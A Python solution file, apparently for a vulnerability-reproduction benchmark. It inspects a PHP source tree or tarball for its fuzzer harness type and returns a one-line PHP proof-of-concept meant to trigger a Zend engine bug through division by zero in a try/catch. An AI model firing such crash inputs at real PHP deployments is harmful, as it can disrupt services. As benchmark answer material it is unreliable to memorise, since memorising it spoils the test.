import os
import tarfile
from typing import Optional


class Solution:
    def _is_php_project_tar(self, tf: tarfile.TarFile) -> bool:
        hits = 0
        for m in tf.getmembers():
            n = m.name
            ln = n.lower()
            if "zend/" in ln or ln.endswith("/zend") or "/zend_" in ln:
                hits += 1
            if "zend_execute" in ln or "zend_vm_execute" in ln:
                return True
            if ln.endswith("main/php.h") or ln.endswith("/php.h"):
                hits += 1
            if ln.endswith("zend/zend.h") or ln.endswith("zend/zend_types.h"):
                return True
            if hits >= 3:
                return True
        return False

    def _detect_php_mode_tar(self, tf: tarfile.TarFile) -> str:
        for m in tf.getmembers():
            ln = m.name.lower()
            if "sapi/fuzzer" in ln:
                return "eval"

        checked = 0
        for m in tf.getmembers():
            if checked >= 200:
                break
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            ln = m.name.lower()
            if not (ln.endswith(".c") or ln.endswith(".cc") or ln.endswith(".cpp") or ln.endswith(".cxx")):
                continue
            if "fuzz" not in ln and "fuzzer" not in ln:
                continue

            checked += 1
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue

            if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
                continue

            if (b"zend_eval_string" in data) or (b"zend_eval_stringl" in data) or (b"zend_eval_string_ex" in data):
                return "eval"

            if (b"php_execute_script" in data) or (b"php_execute_simple_script" in data):
                return "file"

        return "file"

    def _is_php_project_dir(self, root: str) -> bool:
        hits = 0
        for base, dirs, files in os.walk(root):
            lb = base.lower()
            if "/zend" in lb or lb.endswith("/zend"):
                hits += 1
            for fn in files:
                lfn = fn.lower()
                if lfn in ("zend_execute.c", "zend_execute.h", "zend_vm_execute.h"):
                    return True
                if lfn in ("php.h", "zend.h", "zend_types.h"):
                    hits += 1
                if hits >= 5:
                    return True
        return False

    def _detect_php_mode_dir(self, root: str) -> str:
        for base, dirs, files in os.walk(root):
            lb = base.lower()
            if "sapi/fuzzer" in lb.replace("\\", "/"):
                return "eval"

        checked = 0
        for base, dirs, files in os.walk(root):
            for fn in files:
                if checked >= 200:
                    return "file"
                lfn = fn.lower()
                if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".cxx")):
                    continue
                if "fuzz" not in lfn and "fuzzer" not in lfn:
                    continue
                path = os.path.join(base, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                checked += 1
                if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
                    continue

                if (b"zend_eval_string" in data) or (b"zend_eval_stringl" in data) or (b"zend_eval_string_ex" in data):
                    return "eval"

                if (b"php_execute_script" in data) or (b"php_execute_simple_script" in data):
                    return "file"

        return "file"

    def solve(self, src_path: str) -> bytes:
        poc_eval = b"$a=chr(65);try{$a/=0;}catch(Error $e){}echo$a;"
        poc_file = b"<?php " + poc_eval

        if os.path.isdir(src_path):
            if self._is_php_project_dir(src_path):
                mode = self._detect_php_mode_dir(src_path)
                return poc_eval if mode == "eval" else poc_file
            return poc_eval

        try:
            with tarfile.open(src_path, "r:*") as tf:
                if self._is_php_project_tar(tf):
                    mode = self._detect_php_mode_tar(tf)
                    return poc_eval if mode == "eval" else poc_file
        except Exception:
            pass

        return poc_eval